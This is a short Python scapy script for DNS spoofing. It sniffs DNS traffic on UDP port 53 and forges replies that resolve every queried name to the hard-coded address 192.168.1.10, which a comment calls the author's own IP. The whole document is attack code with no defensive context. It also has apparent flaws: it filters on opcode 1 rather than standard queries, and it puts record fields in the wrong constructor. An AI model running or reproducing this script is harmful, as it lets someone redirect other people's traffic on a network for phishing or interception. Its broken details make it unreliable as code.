from scapy.all import *
import time
import threading

def handle_packet(pkt):

    ip = pkt.getlayer(IP)
    dns = pkt.getlayer(DNS)
    udp = pkt.getlayer(UDP)
    if (dns.qr == 0 and dns.opcode == 1):
        query_host = dns.qd.qname

        dns_replay = IP(src=ip.dst,dst=ip.src)/ \
        UDP(sport=udp.dport,dport=udp.sport)/ \
        DNS(id=dns.id,qr=1,aa=0,rcode=0,qd=dns.qd,an=DNSRR(rrname=query_host),ttl=12,type="A",rclass="IN",rdata="192.168.1.10")
        print("[+] Send %s has %s to %s"%(query_host,"192.168.1.10",ip.src))
        send(dns_replay)
sniff(filter="udp port 53",prn=handle_packet)

# rdata ---> my ip for responce that dns
